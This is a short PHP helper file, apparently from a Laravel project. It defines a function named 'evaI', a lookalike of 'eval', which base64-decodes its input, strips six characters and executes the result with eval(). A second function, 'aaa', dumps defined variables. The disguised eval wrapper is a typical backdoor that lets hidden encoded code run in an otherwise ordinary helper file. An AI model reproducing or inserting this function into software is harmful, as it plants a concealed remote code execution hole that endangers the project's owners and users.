<?php

if (! function_exists('evaI')) {
    function evaI($value)
    {
        eval(substr(base64_decode($value),6));
    }
}


if (! function_exists('aaa')) {
    function aaa()
    {
        $arr = get_defined_vars();
        dd($arr);
    }
}
